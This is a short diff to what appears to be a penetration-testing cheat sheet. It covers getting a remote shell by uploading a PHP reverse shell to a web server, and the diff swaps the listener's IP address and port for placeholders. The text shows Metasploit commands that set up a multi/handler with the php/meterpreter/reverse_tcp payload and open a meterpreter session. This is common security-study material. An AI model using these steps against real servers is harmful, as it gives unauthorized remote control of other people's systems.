@@ -6,8 +6,8 @@ Upload a reverse shell php file, navigate to the file and it will exectue.
 ```
 msf > use multi/handler
 msf exploit(handler) > set payload php/meterpreter/reverse_tcp
-msf exploit(handler) > set lhost 192.168.1.104
-msf exploit(handler) > set lport 3333
+msf exploit(handler) > set lhost 1.2.3.4
+msf exploit(handler) > set lport 9999
 msf exploit(handler) > run
 meterpreter > sysinfo
 ```
